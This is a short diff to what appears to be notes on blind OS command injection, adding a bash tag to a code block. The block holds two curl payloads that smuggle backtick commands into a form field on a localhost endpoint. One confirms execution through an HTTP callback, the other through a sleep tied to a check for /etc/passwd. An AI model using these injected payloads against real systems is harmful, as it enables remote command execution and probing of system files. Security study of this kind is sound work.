@@ -121,11 +121,11 @@ public function profile(): Response{
 - https://www.gnu.org/software/bash/manual/html_node/Quoting.html
 - https://portswigger.net/web-security/os-command-injection#blind-os-command-injection-vulnerabilities
 
-```
+```bash
 # --form-string avoid interpreting @ and < => for raw binaries
 curl http://localhost:8000/index.php -d 'arg=`curl -m1 http://localhost:8000/RCE`'
 
-curl http://localhost:8000/index.php --form-string 'arg=`[[ -f /etc/passwd ]] && sleep 3`'
+curl http://localhost:8000/index.php --form-string 'arg=`[ -f /etc/passwd ] && sleep 3`'
 ```
 
 
